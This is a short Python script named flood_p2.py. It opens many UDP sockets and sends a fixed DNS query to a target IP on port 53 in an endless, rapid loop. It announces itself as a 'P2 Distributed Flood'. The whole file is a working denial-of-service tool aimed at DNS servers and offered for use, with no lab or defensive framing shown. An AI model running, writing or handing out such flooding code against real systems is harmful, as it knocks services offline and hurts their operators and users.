import socket
import time
import sys

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 flood_p2.py <target_ip> <num_sources>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    num_sources = int(sys.argv[2])

    dns_query = b'\x56\x78\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' \
                b'\x07example\x03com\x00\x00\x01\x00\x01'

    socks = []
    for _ in range(num_sources):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socks.append(s)

    print(f"[*] Starting P2 Distributed Flood towards {target_ip}:53 using {num_sources} channels...")
    
    try:
        while True:
            for s in socks:
                s.sendto(dns_query, (target_ip, 53))
            time.sleep(0.001)
    except KeyboardInterrupt:
        print("\n[*] Stopped P2 flood.")
        for s in socks:
            s.close()

if __name__ == '__main__':
    main()